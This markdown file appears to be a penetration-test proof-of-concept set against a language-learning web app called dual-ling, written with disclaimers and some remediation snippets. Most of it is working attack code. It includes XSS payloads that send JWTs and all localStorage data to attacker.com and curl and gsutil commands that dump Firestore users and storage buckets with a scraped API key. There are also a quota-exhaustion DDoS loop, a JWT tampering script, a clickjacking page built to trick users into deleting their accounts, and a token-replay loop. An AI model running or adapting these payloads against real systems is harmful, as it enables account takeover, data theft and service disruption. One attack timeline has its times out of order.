# Proof of Concept - Vulnerability Demonstrations
**Status**: Research purposes only - Do NOT use for malicious activities  
**Disclaimer**: These are educational demonstrations showing why vulnerabilities are dangerous  
**Last Updated**: 2025-11-11

---

## Important Legal Notice

⚠️ **WARNING**: The code and payloads in this document are for **authorized security testing only**. Unauthorized access to computer systems is illegal. Always obtain written permission before testing any system.

These demonstrations are provided to show the **real impact** of documented vulnerabilities. They illustrate why remediation is critical.

---

## PoC #1: JWT Token Theft via XSS

**Vulnerability**: #1 - JWT tokens in localStorage  
**Attack Vector**: Cross-Site Scripting (XSS) injection  
**Impact**: Session hijacking, account takeover  

### Attack Scenario

A malicious actor injects JavaScript into a comment or forum post on dual-ling:

```html
<!-- Malicious comment containing XSS payload -->
<img src=x onerror="
  const token = localStorage.getItem('auth_token');
  const refreshToken = localStorage.getItem('auth_refresh_token');
  
  fetch('https://attacker.com/steal', {
    method: 'POST',
    body: JSON.stringify({
      accessToken: token,
      refreshToken: refreshToken,
      timestamp: new Date().toISOString()
    })
  });
">
```

### What Happens

1. Teacher visits page with comment
2. `<img>` tag fails to load, triggers `onerror` handler
3. JavaScript executes in teacher's browser context
4. Attacker's server receives valid JWT tokens
5. Attacker can now:
   - Impersonate teacher
   - Access student data
   - Modify course materials
   - Export student information
   - Delete student accounts

### Attacker's Next Steps

```javascript
// Using stolen token to access protected API
const stolenToken = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...';

// 1. Fetch teacher's profile
fetch('https://dual-ling.com/api/user/profile', {
  headers: {
    'Authorization': `Bearer ${stolenToken}`,
    'Cookie': `auth_token=${stolenToken}`
  }
})
.then(r => r.json())
.then(profile => {
  console.log('Stolen Profile:', profile);
  // Can now see email, enrolled courses, students, payment info
});

// 2. Access all student data
fetch('https://dual-ling.com/api/courses/my-courses', {
  headers: { 'Authorization': `Bearer ${stolenToken}` }
})
.then(r => r.json())
.then(courses => {
  // Get list of all courses taught by compromised account
  courses.forEach(course => {
    fetchStudentData(course.id, stolenToken);
  });
});

// 3. Export student data
fetch('https://dual-ling.com/api/user/export', {
  headers: { 'Authorization': `Bearer ${stolenToken}` }
})
.then(r => r.json())
.then(data => {
  // Send sensitive student data to attacker's server
  exfiltrateData(data);
});
```

### Why It Works

- ✅ XSS payload successfully injects
- ✅ localStorage is accessible from JavaScript
- ✅ No HttpOnly flag prevents access
- ✅ API accepts Bearer tokens without additional validation

### Remediation Proof

After implementing **HttpOnly cookies**:

```javascript
// ❌ Attacker tries to steal token
const token = localStorage.getItem('auth_token');
console.log(token); // Returns: null (empty localStorage)

// ❌ Attacker tries to access via cookie
document.cookie; 
// Returns: "" (HttpOnly cookies are NOT visible to JavaScript)

// ✅ Request still works because browser auto-includes HttpOnly cookies
fetch('https://dual-ling.com/api/user', {
  credentials: 'include' // Browser includes HttpOnly cookie automatically
})
// Returns valid response - but attacker CAN'T read the cookie!
```

---

## PoC #2: Firebase Credentials Exploitation

**Vulnerability**: #2 - Firebase API key in client code  
**Attack Vector**: Direct Firebase access with exposed credentials  
**Impact**: Database breach, DDoS attack, cost inflation  

### Finding the Credentials

```bash
# 1. Attacker views page source
curl https://dual-ling.com | grep -i firebase

# Output found:
# const firebaseConfig = {
#   apiKey: "AIzaSyDxxx...xxx",
#   projectId: "dual-ling-prod",
#   ...
# };

# 2. Or in JavaScript bundle
curl https://dual-ling.com/_next/static/chunks/main.js | \
  grep -o "AIzaSy[A-Za-z0-9_-]*" | head -1
# Returns: AIzaSyDxxx...xxx

# 3. Or in Network tab of developer tools
# All Firebase calls include API key as query parameter
```

### Direct Firestore Access

```bash
# Using exposed API key and project ID
API_KEY="AIzaSyDxxx...xxx"
PROJECT_ID="dual-ling-prod"

# Query Firestore database directly
curl -X POST \
  "https://firestore.googleapis.com/v1/projects/${PROJECT_ID}/databases/(default)/documents:runQuery" \
  -H "Content-Type: application/json" \
  -d '{
    "structuredQuery": {
      "from": [{"collectionId": "users"}],
      "limit": 100
    }
  }' \
  -H "X-Goog-Api-Key: ${API_KEY}"

# Response: All user documents (emails, profiles, payment info)
```

### Firebase Realtime Database Access

```javascript
// Using Firebase client SDK with exposed credentials
import { initializeApp } from 'firebase/app';
import { getDatabase, ref, get } from 'firebase/database';

const firebaseConfig = {
  apiKey: "AIzaSyDxxx...xxx", // Stolen from source code
  projectId: "dual-ling-prod",
  databaseURL: "https://dual-ling.firebaseio.com"
};

const app = initializeApp(firebaseConfig);
const db = getDatabase(app);

// Read all user data
const userRef = ref(db, 'users');
get(userRef).then(snapshot => {
  console.log('All Users:', snapshot.val());
  // Attacker gets: emails, names, payment methods, etc.
});
```

### Storage Bucket Enumeration

```bash
# List all files in storage bucket
gsutil -m ls -r gs://dual-ling-prod.appspot.com/

# Output: All uploaded course materials, student documents, etc.

# Download sensitive files
gsutil -m cp -r gs://dual-ling-prod.appspot.com/courses/* ./stolen-courses/

# List and download user profile pictures
gsutil -m ls gs://dual-ling-prod.appspot.com/users/*/profile-pic.*
```

### DDoS via API Quota Abuse

```javascript
// Generate massive database reads to exhaust quota
async function ddosAttack() {
  const firebaseConfig = { apiKey: "AIzaSyDxxx...xxx", ... };
  const app = initializeApp(firebaseConfig);
  const db = getDatabase(app);

  // Send 1000 requests per second
  setInterval(() => {
    for (let i = 0; i < 1000; i++) {
      fetch(`https://firestore.googleapis.com/v1/projects/dual-ling-prod/databases/(default)/documents/users/fake-${i}`, {
        headers: { 'X-Goog-Api-Key': firebaseConfig.apiKey }
      });
    }
  }, 1000);
}

// Result: Firebase bill spikes to $10,000+/month
// Service unavailable for legitimate users
```

### Remediation Proof

After **Backend API Gateway**:

```javascript
// Attacker tries to access Firestore directly
const API_KEY = "AIzaSyDxxx...xxx"; // From source code

fetch(`https://firestore.googleapis.com/v1/projects/dual-ling-prod/databases/(default)/documents/users`,
  { headers: { 'X-Goog-Api-Key': API_KEY } }
);

// ✅ Result: 401 Unauthorized
// Reason: Firebase rules now ONLY allow backend service account
// API key (public) authentication is DENIED
```

---

## PoC #3: JWT Claim Modification

**Vulnerability**: #3 - Weak token validation  
**Attack Vector**: Token claim tampering  
**Impact**: Privilege escalation, unauthorized access  

### Attack Scenario

```javascript
// 1. Attacker obtains valid token (via XSS or network sniffing)
const validToken = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c2VyXzEyMyIsInJvbGUiOiJzdHVkZW50In0.xxxxx';

// 2. Decode token to see claims
const decoded = JSON.parse(atob(validToken.split('.')[1]));
console.log(decoded);
// Output: { sub: "user_123", role: "student" }

// 3. If validation is weak (doesn't verify signature properly),
//    attacker might be able to modify claims
//    This is EASIER if developer made mistakes in validation

// 4. Attacker crafts new token with admin role
const modifiedPayload = { sub: "user_123", role: "admin" };
const modified = btoa(JSON.stringify(modifiedPayload));

// 5. Try modified token
const tamperedToken = validToken.split('.')[0] + '.' + modified + '.' + validToken.split('.')[2];

// 6. Send request with tampered token
fetch('https://dual-ling.com/api/admin/users', {
  headers: { 'Authorization': `Bearer ${tamperedToken}` }
});

// If validation is weak: ✅ Request succeeds!
// If validation is strict: ❌ Request rejected with "Invalid signature"
```

### Why This Works

```typescript
// ❌ WEAK VALIDATION (vulnerable)
function validateTokenWeak(token: string) {
  try {
    const decoded = jwt.decode(token); // Doesn't verify!
    return decoded;
  } catch {
    return null;
  }
}

// ❌ PARTIAL VALIDATION (still vulnerable)
function validateTokenPartial(token: string) {
  try {
    const decoded = jwt.verify(token, SECRET_KEY); // Verifies, but...
    // Missing: Check if role is valid
    // Missing: Check if token type is correct
    // Missing: Check if exp exists
    return decoded;
  } catch {
    return null;
  }
}

// ✅ STRICT VALIDATION (secure)
function validateTokenStrict(token: string) {
  try {
    const decoded = jwt.verify(token, SECRET_KEY, {
      algorithms: ['HS256'],
      issuer: 'dual-ling-auth'
    });
    
    // Validate claims
    if (!decoded.sub || !decoded.role) throw new Error('Missing claims');
    if (!['student', 'teacher', 'admin'].includes(decoded.role)) throw new Error('Invalid role');
    if (decoded.exp <= Date.now() / 1000) throw new Error('Expired');
    
    return decoded;
  } catch {
    return null;
  }
}
```

---

## PoC #4: XSS leading to Data Theft

**Vulnerability**: #7 - User data in localStorage  
**Attack Vector**: XSS + localStorage access  
**Impact**: Privacy breach, identity theft  

### Attack Code

```javascript
// Simple XSS payload injected via comment, forum, or profile bio
setInterval(function() {
  try {
    // Extract all localStorage data
    const allData = {};
    for (let i = 0; i < localStorage.length; i++) {
      const key = localStorage.key(i);
      allData[key] = localStorage.getItem(key);
    }

    // Parse sensitive data
    const userProfile = JSON.parse(allData.user_profile || '{}');
    const authToken = allData.auth_token;

    // Exfiltrate to attacker server
    fetch('https://attacker.com/collect', {
      method: 'POST',
      body: JSON.stringify({
        timestamp: new Date().toISOString(),
        userAgent: navigator.userAgent,
        url: window.location.href,
        profile: userProfile, // Email, name, role
        token: authToken,
        allLocalStorage: allData
      })
    }).catch(e => {}); // Silently fail

  } catch(e) {}
}, 5000); // Run every 5 seconds
```

### Data Captured

```javascript
{
  "timestamp": "2025-11-11T10:30:00Z",
  "userAgent": "Mozilla/5.0...",
  "url": "https://dual-ling.com/courses/lithuanian-101",
  "profile": {
    "id": "user_abc123",
    "email": "teacher@example.com",
    "firstName": "John",
    "lastName": "Smith",
    "role": "teacher",
    "courseIds": ["course_1", "course_2", "course_3"],
    "studentCount": 45
  },
  "token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...",
  "allLocalStorage": {
    "user_profile": "...",
    "auth_token": "...",
    "auth_refresh_token": "...",
    "firebase_config": {...},
    "theme": "dark",
    "language": "lt"
  }
}
```

### Impact Chain

1. Attacker has teacher's email → targets with phishing
2. Attacker has token → accesses all student data
3. Attacker knows teacher has 45 students → knows this is active teacher
4. Attacker sells data on dark web or uses for targeted attacks

---

## PoC #5: Clickjacking Attack

**Vulnerability**: #4 - Missing X-Frame-Options header  
**Attack Vector**: Embedding app in hidden iframe  
**Impact**: Account deletion, unauthorized actions  

### Attacker's Malicious Page

```html
<!DOCTYPE html>
<html>
<head>
  <title>Free Dual-ling Premium!</title>
  <style>
    iframe {
      position: absolute;
      opacity: 0;
      width: 100%;
      height: 100%;
    }
  </style>
</head>
<body>
  <!-- Hidden dual-ling app -->
  <iframe src="https://dual-ling.com/settings/delete-account"></iframe>

  <!-- Fake button with misleading text -->
  <button style="
    position: absolute;
    top: 50%;
    left: 50%;
    transform: translate(-50%, -50%);
    padding: 20px 40px;
    font-size: 24px;
    background: gold;
    border: none;
    cursor: pointer;
    z-index: 1;
  ">
    🎁 CLAIM FREE PREMIUM YEAR 🎁
  </button>

  <script>
    document.addEventListener('click', function() {
      // Any click goes to the hidden iframe instead
      // If user clicks "claim free premium", they're actually
      // clicking "delete account" in the hidden iframe
    });
  </script>
</body>
</html>
```

### How It Works

1. Attacker spreads link: "Free Dual-ling Premium! Click here"
2. Teacher clicks button
3. Button click actually targets hidden iframe
4. User confirms account deletion without realizing
5. Account is deleted

### Remediation Proof

After adding **X-Frame-Options: DENY**:

```
Teacher visits attacker's page
  ↓
Page tries to embed dual-ling in iframe
  ↓
Server responds with: X-Frame-Options: DENY
  ↓
Browser blocks iframe (blank/error)
  ↓
Clickjacking prevented! ✅
```

---

## PoC #6: Session Hijacking via Token Replay

**Vulnerability**: #6 - Missing logout invalidation  
**Attack Vector**: Token reuse after logout  
**Impact**: Unauthorized access after logout  

### Attack Scenario

```timeline
10:00 AM: Teacher logs in
          → Receives access_token (valid for 15 minutes)
          → Receives refresh_token (valid for 7 days)

10:05 AM: Attacker intercepts tokens from network traffic
          (Network traffic wasn't encrypted, or XSS exposed them)

10:10 AM: Teacher clicks Logout
          → Frontend clears localStorage
          → Teacher thinks they're logged out

10:11 AM: Attacker uses stolen tokens
          → Accesses /api/user with stolen access_token
          → ✅ Request succeeds (token still valid until 10:15)
          → Attacker can read/modify data

10:20 AM: Original teacher tries logging back in
          → Attacker's access_token still valid for 5 more minutes
          → Attacker continues accessing data as teacher

10:15 AM: Original access_token expires
10:11 AM: But attacker's refresh_token is still valid for 7 days
          → Attacker generates new access_token
          → Continues accessing data
```

### Attack Code

```javascript
// Stolen tokens from earlier compromise
const stolenAccessToken = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c2VyXzEyMyIsImV4cCI6MTcwMDAwMDAwMH0.xxxxx';
const stolenRefreshToken = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c2VyXzEyMyIsInR5cGUiOiJyZWZyZXNoIn0.yyyyy';

// Even after teacher logout, attacker can use tokens
async function accessTeacherData() {
  // Try access token
  let response = await fetch('https://dual-ling.com/api/user', {
    headers: { 'Authorization': `Bearer ${stolenAccessToken}` }
  });

  if (response.status === 401) {
    // Access token expired, use refresh token
    const refreshResponse = await fetch('https://dual-ling.com/api/auth/refresh', {
      method: 'POST',
      body: JSON.stringify({ refresh_token: stolenRefreshToken })
    });

    if (refreshResponse.ok) {
      const { access_token } = await refreshResponse.json();
      // New access token obtained! Continue accessing data
    }
  }

  return response.json();
}

// Attacker continues accessing for up to 7 days
setInterval(accessTeacherData, 60000); // Every minute
```

### Remediation

```typescript
// After logout, revoke token on server
async function logout(token: string) {
  // Add to blacklist
  await revokeToken(token);
  
  // Disable refresh token
  await disableRefreshToken(token);
  
  // Return to user
  return { success: true, message: 'Logged out' };
}

// When token is used, check if it's revoked
function validateToken(token: string) {
  if (isTokenRevoked(token)) {
    throw new Error('Token has been revoked');
  }
  // ... other validation
}

// Now attacker's stolen tokens are useless
fetch('https://dual-ling.com/api/user', {
  headers: { 'Authorization': `Bearer ${stolenAccessToken}` }
});
// ❌ Response: 401 Unauthorized - Token revoked
```

---

## Proof of Impact Summary

| Vulnerability | PoC Demonstrated | Risk |
|---|---|---|
| JWT in localStorage | XSS → Token theft | HIGH |
| Firebase API Key | Direct DB access, DDoS | CRITICAL |
| Weak Token Validation | Privilege escalation | HIGH |
| Missing Headers | Clickjacking | MEDIUM |
| No HttpOnly | Data exfiltration | HIGH |
| Missing Logout | Session reuse | MEDIUM |
| Data in localStorage | Privacy breach | MEDIUM |

**Conclusion**: All vulnerabilities are **practically exploitable** and **actively dangerous**.

---

## Responsible Disclosure

These proof-of-concepts are provided for **educational and authorized security testing only**:

✅ **Legal Uses**:
- Testing your own application
- Teaching security concepts
- Authorized penetration testing with written permission
- Security research with proper authorization

❌ **Illegal Uses**:
- Unauthorized access to any system
- Data theft or extortion
- Service disruption or DDoS
- Identity theft

